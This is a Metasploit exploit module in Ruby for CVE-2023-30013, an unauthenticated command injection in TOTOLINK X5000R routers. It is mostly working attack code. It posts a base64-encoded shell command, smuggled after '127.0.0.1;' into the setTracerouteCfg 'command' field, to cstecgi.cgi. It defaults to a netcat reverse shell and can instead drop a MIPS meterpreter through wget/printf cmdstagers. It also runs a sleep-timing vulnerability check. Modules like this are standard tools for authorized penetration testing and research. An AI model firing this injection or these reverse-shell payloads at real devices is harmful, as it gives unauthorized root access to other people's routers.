##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TOTOLINK X500R unauthenticated remote command execution vulnerability.',
        'Description' => %q{
          TOTOLINK X5000R V9.1.0u.6118_B20201102 and V9.1.0u.6369_B20230113 contain a command insertion vulnerability
          in setting/setTracerouteCfg. This vulnerability allows an attacker to execute arbitrary commands through
          the "command" parameter.
          After exploitation, an attacker will have full access with the same user privileges under
          which the the webserver is running (typically as user `root`, ;-).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Kazamayc https://github.com/Kazamayc', # Discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2023-30013'],
          ['URL', 'https://attackerkb.com/topics/xnX3I3PEgM/cve-2023-30013']
        ],
        'DisclosureDate' => '2023-05-05',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_MIPSLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_MIPSLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'printf', 'echo', 'bourne'],
              'Linemax' => 65535,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def execute_command(cmd, _opts = {})
    # Encode payload with base64 and generate random number
    cmd_b64 = Base64.strict_encode64(cmd)
    cmd = "echo #{cmd_b64}|base64 -d|bash"
    num = rand(1..500)

    return send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'cstecgi.cgi'),
      'data' => "{\"command\":\"127.0.0.1; #{cmd};\",\"num\":\"#{num}\",\"topicurl\":\"setTracerouteCfg\"}"
    })
  end

  # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
  def check
    print_status("Checking if #{peer} can be exploited.")
    sleep_time = rand(3..7)

    # check response with dummy command to determine if traceroute vulnerable function is available
    res = execute_command("echo #{sleep_time}")
    return CheckCode::Unknown('No response received from target.') unless res
    return CheckCode::Safe('No valid response received from target.') unless res.code == 200 && res.body.include?('success')

    # if traceroute vulnerable function is available, perform blind command injection using the sleep comnmand
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end
    return CheckCode::Unknown('No response received from target.') unless res
    return CheckCode::Safe('No valid response received from target.') unless res.code == 200 && res.body.include?('success')

    print_status("Elapsed time: #{elapsed_time.round(2)} seconds.")
    return CheckCode::Safe('Blind command injection failed.') unless elapsed_time >= sleep_time

    CheckCode::Vulnerable('Successfully tested blind command injection.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
